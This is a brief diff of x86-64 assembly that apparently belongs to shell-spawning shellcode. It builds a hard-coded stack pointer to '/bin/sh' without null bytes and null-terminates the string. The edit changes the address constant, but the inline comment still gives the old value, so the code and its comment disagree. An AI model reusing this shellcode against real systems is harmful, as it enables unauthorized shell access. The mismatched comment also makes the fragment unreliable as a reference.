@@ -12,7 +12,7 @@ main:
         xor     %rcx, %rcx
         xor     $0x7fff, %cx
         shl     $32, %rcx
-        xor     $0xffffdf50, %ecx        /* %rcx=0x00007fffffffdf50 (ptr to str  "/bin/sh") */
+        xor     $0xffffdf13, %ecx        /* %rcx=0x00007fffffffdf50 (ptr to str  "/bin/sh") */
 
         xor     %al, %al
         mov     %al, 8(%rcx)             /* Add '\0' to "/bin/sh" */
